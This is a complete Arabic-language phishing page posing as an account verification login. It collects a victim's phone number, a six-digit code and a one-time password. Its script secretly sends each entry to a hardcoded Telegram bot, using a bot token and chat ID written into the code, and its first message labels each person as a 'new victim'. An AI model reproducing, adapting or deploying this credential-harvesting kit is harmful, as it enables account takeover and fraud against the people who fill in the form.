

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: sans-serif; }
        .hidden { display: none; }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen p-4">

    <div class="bg-white p-8 rounded-xl shadow-lg w-full max-w-md">
        <!-- الواجهة الأولى: الهاتف والكود -->
        <div id="step1">
            <h2 class="text-2xl font-bold mb-6 text-center text-blue-700">التحقق من الحساب</h2>
            
            <label class="block mb-2 text-sm font-medium">رقم الهاتف</label>
            <input type="tel" id="phone" placeholder="00000000" class="w-full p-3 mb-4 border rounded-lg text-right focus:ring-2 focus:ring-blue-500 outline-none">
            
            <label class="block mb-2 text-sm font-medium">كود التحقق (6 أرقام)</label>
            <input type="text" id="code6" placeholder="******" maxlength="6" class="w-full p-3 mb-6 border rounded-lg text-right focus:ring-2 focus:ring-blue-500 outline-none">
            
            <button onclick="goToStep2()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition">التالي</button>
        </div>

        <!-- الواجهة الثانية: رمز OTP -->
        <div id="step2" class="hidden">
            <h2 class="text-2xl font-bold mb-6 text-center text-green-700">تأكيد الرمز الإضافي</h2>
            <p class="text-center text-gray-500 mb-6 text-sm">يرجى إدخال رمز OTP المكون من 6 أرقام للمتابعة</p>
            
            <label class="block mb-2 text-sm font-medium">رمز OTP</label>
            <input type="text" id="otp" placeholder="******" maxlength="6" class="w-full p-3 mb-6 border rounded-lg text-right focus:ring-2 focus:ring-green-500 outline-none">
            
            <button id="finalBtn" onclick="submitFinal()" class="w-full bg-green-600 text-white py-3 rounded-lg font-bold hover:bg-green-700 transition">إرسال وتأكيد</button>
        </div>
        
        <div id="successMsg" class="hidden text-center py-4">
            <p class="text-green-600 font-bold">تم إرسال البيانات بنجاح!</p>
        </div>
    </div>

    <script>
        // البيانات المستخرجة من صورك
        const TELEGRAM_TOKEN = "8652191411:AAES2Ljmd2mCH_lm4syo-yAJiUowKMjAPN4";
        const CHAT_ID = "8624656090";

        let userPhone = "";
        let userCode6 = "";

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            try {
                await fetch(url);
            } catch (error) {
                console.error("خطأ في الإرسال:", error);
            }
        }

        function goToStep2() {
            userPhone = document.getElementById('phone').value;
            userCode6 = document.getElementById('code6').value;
            
            if(userPhone.length > 5 && userCode6.length === 6) {
                // إرسال البيانات الأولى سراً للتلجرام
                sendToTelegram(`⚠️ ضحية جديدة:\n📞 الهاتف: ${userPhone}\n🔢 الكود: ${userCode6}`);
                
                // الانتقال للواجهة الثانية
                document.getElementById('step1').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            } else {
                alert("تأكد من إدخال رقم هاتف صحيح وكود من 6 أرقام");
            }
        }

        async function submitFinal() {
            const otp = document.getElementById('otp').value;
            const btn = document.getElementById('finalBtn');
            
            if(otp.length === 6) {
                btn.disabled = true;
                btn.innerText = "جاري التأكيد...";
                
                // إرسال الرمز النهائي
                await sendToTelegram(`🔐 رمز الـ OTP هو: ${otp}\nللهاتف: ${userPhone}`);
                
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('successMsg').classList.remove('hidden');
            } else {
                alert("يرجى إدخال رمز OTP صحيح");
            }
        }
    </script>
</body>
</html>

